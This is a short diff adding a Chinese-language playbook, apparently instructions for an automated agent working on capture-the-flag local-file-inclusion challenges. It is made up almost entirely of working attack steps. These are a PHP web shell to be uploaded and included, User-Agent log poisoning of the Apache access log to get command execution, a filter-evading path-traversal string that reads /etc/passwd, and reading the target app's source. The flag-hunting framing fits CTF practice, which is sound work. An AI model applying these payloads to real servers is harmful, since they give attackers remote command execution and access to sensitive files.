@@ -1,0 +1,6 @@
+LFI 漏洞后利用获取 FLAG
+执行命令请求用 distinguish 工具对比「不传 cmd」与「传 cmd」的请求结果；不要在命令执行时用 http_request。
+1. 若 LFI 配合文件上传：上传 <?php system($_REQUEST['cmd']);?>，再用 LFI 入口包含该文件并传 cmd，如 /entry.php?cmd=cat /flag.txt
+2. 正常 LFI：用 User-Agent 注入 <?php system($_REQUEST['cmd']);?> 后访问 LFI 入口，再包含 ../../../../../var/log/apache2/access.log 并传 cmd 执行
+3. 路径穿越受限时用：.....///.....///.....///.....///.....///.....///etc/passwd
+4. Python 服务先读 /app/app.py
